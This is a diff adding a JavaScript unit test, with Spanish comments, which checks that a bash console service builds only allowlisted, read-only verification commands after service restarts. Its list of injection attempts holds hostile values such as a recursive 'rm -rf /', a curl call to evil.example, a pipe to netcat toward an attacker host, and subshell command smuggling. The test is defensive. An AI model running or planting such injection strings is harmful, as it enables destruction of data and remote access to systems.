@@ -305,3 +305,47 @@ test('[Unit] Programados: entrega incierta no se reintenta (sin duplicados)', as
   programados.cancelarMensajeProgramado(idInc2);
   programados.cancelarMensajeProgramado(idInc3);
 });
+
+// --- bashConsoleService: verificacion posterior solo-lectura e inmune a inyeccion ---
+const bashSvc = await import('../../bashConsoleService.js');
+
+test('[Unit] Bash: verificacion posterior es allowlist de solo lectura e inmune a inyeccion', () => {
+  const PERMITIDO = /^(pm2 status( [\w@./-]+)?|systemctl is-active [\w@.-]+|service [\w@.-]+ status|docker inspect -f '\{\{\.State\.Status\}\}' [\w.-]+|docker ps|ufw status)$/;
+
+  // Casos legitimos
+  const legitimos = [
+    'pm2 restart davis-bot',
+    'systemctl restart nginx',
+    'service ssh restart',
+    'docker restart mi-contenedor',
+    'docker-compose up -d',
+    'ufw allow 22/tcp'
+  ];
+  for (const cmd of legitimos) {
+    const probe = bashSvc.buildVerificationCommand(cmd);
+    assert.ok(probe, `debe generar verificacion para: ${cmd}`);
+    assert.ok(PERMITIDO.test(probe), `verificacion fuera del allowlist: ${probe}`);
+    assert.ok(!/[$`;&|<>\\]/.test(probe), `verificacion con metacaracteres: ${probe}`);
+  }
+
+  // Intentos de inyeccion: el token capturado no admite metacaracteres
+  const trampas = [
+    'pm2 restart app$(whoami)',
+    'pm2 restart app; rm -rf /',
+    'systemctl restart nginx && curl http://evil.example',
+    'docker restart app`id`',
+    'service ssh restart | nc atacante 4444',
+    'pm2 restart "app; touch /tmp/pwn"'
+  ];
+  for (const cmd of trampas) {
+    const probe = bashSvc.buildVerificationCommand(cmd);
+    if (probe !== null) {
+      assert.ok(PERMITIDO.test(probe), `inyeccion colada en verificacion: ${cmd} -> ${probe}`);
+    }
+  }
+
+  // Comandos sin verificacion conocida: null (sin ejecucion extra)
+  assert.equal(bashSvc.buildVerificationCommand('echo hola'), null);
+  assert.equal(bashSvc.buildVerificationCommand('pm2 status api'), null, 'una lectura no genera otra verificacion');
+  assert.equal(bashSvc.buildVerificationCommand(''), null);
+});
